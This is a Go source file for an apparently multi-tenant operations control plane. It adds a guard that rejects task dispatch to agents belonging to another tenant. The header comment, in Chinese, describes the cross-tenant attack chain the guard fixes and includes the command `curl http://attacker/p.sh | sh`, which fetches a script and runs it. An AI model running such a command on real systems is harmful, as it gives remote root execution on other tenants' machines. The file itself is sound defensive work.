package controlplane

// tenant_guard.go 多租户隔离的统一防线（P0-6）。
//
// 背景（商用就绪评审 P0-6 问题 B —— 跨租户远程命令执行）：
// 任务队列按 agent_id 单独寻址（store.ClaimTask 的 WHERE agent_id=? 无租户维度），
// 而多条「下发任务」的 HTTP 路径直接取请求体里的 deviceID/agentID 建任务、未校验
// 目标 agent 归属。完整攻击链：
//  1. 租户 A 中具备 script:write / cmdb:write 的主体（cmdb 属 operatorGroups，
//     故默认 operator 角色即可）创建内容为 `curl http://attacker/p.sh | sh` 的脚本；
//  2. POST /api/v1/scripts/{id}/execute {"deviceID":"<租户 B 的 agentID>"}
//     → 无租户校验，任务创建成功；
//  3. 租户 B 的 agent 按 agent_id 领取该任务并以 root 执行。
//
// 本文件提供统一校验入口，取代「各 handler 各写一份」的做法：
//   - requireTenantAgent：HTTP 路径用（校验失败写 403 并返回 false）；
//   - tenantAgent：非 HTTP 路径/执行器用（background 循环、automation 执行器）。
//
// 判定语义与既有正确实现（server_tasks.go handleCreateTask、
// middleware_deploy_handler.go、os_template_handlers.go、server_network.go）保持一致：
// agent 不存在，或其 TenantID 与调用方租户不一致 → 拒绝。
// 调用方租户为空（--require-auth=false 的无租户开放模式）时跳过归属校验，
// 保持内网/开发部署的既有行为不变。

import (
	"errors"
	"fmt"
	"net/http"
	"regexp"

	"github.com/Levango7/OpsMesh/internal/controlplane/paginate"
	"github.com/Levango7/OpsMesh/internal/proto"
	"github.com/Levango7/OpsMesh/internal/store"
)

// tenantOrDefault 将空租户归一为平台默认租户 "default"。
// 与 store 层 normalizeTenantID 同语义；控制面侧独立实现以免向 store 暴露内部细节。
func tenantOrDefault(tenantID string) string {
	if tenantID == "" {
		return "default"
	}
	return tenantID
}

// tenantIDPattern 租户 ID 允许的字符集。
// 租户 ID 会流入多租户 schema 名（MultiSchemaStore 的 SchemaNamer）与各类按租户
// 过滤的 SQL 参数，故在唯一的写入入口（创建/更新用户）做保守校验：字母/数字/下划线/
// 点/连字符，1–64 字符（与 users.tenant_id VARCHAR(64) 对齐）。
var tenantIDPattern = regexp.MustCompile(`^[A-Za-z0-9_.-]{1,64}$`)

// validateTenantID 校验租户 ID 字面量是否合法（空值不合法，调用方应先归一）。
func validateTenantID(tenantID string) error {
	if tenantID == "" {
		return errors.New("tenantId is empty")
	}
	if !tenantIDPattern.MatchString(tenantID) {
		return fmt.Errorf("tenantId 含非法字符（仅允许字母/数字/下划线/点/连字符，最长 64）: %q", tenantID)
	}
	return nil
}

// tenantAgentIn 解析目标 agent 并校验其归属租户（包级实现，供非 *Server 持有者复用，
// 如 automationExecutor 这类无 *Server 引用的执行器）。
// tenantID 为空表示调用方无租户上下文（开放模式），此时仅校验 agent 存在。
func tenantAgentIn(st store.Store, agentID, tenantID string) (*proto.AgentInfo, error) {
	if agentID == "" {
		return nil, errors.New("agentID is required")
	}
	agent := st.Agent(agentID)
	if agent == nil {
		return nil, fmt.Errorf("agent not found: %s", agentID)
	}
	if tenantID != "" && agent.TenantID != tenantID {
		// 不回显目标 agent 的真实租户，避免跨租户探测（agent 是否存在/归属哪租户）。
		return nil, fmt.Errorf("agent not found or tenant mismatch: %s", agentID)
	}
	return agent, nil
}

// tenantAgent 解析目标 agent 并校验其归属租户（非 HTTP 路径）。
func (s *Server) tenantAgent(agentID, tenantID string) (*proto.AgentInfo, error) {
	return tenantAgentIn(s.store, agentID, tenantID)
}

// requireTenantAgent 校验目标 agent 存在且属于调用方租户；失败时已写响应，返回 false。
// 所有「用户可指定 agentID 下发任务」的 HTTP handler 必须先调用本函数再建任务。
func (s *Server) requireTenantAgent(w http.ResponseWriter, agentID, tenantID string) (*proto.AgentInfo, bool) {
	agent, err := s.tenantAgent(agentID, tenantID)
	if err != nil {
		paginate.WriteJSON(w, http.StatusForbidden, map[string]string{"error": err.Error()})
		return nil, false
	}
	return agent, true
}
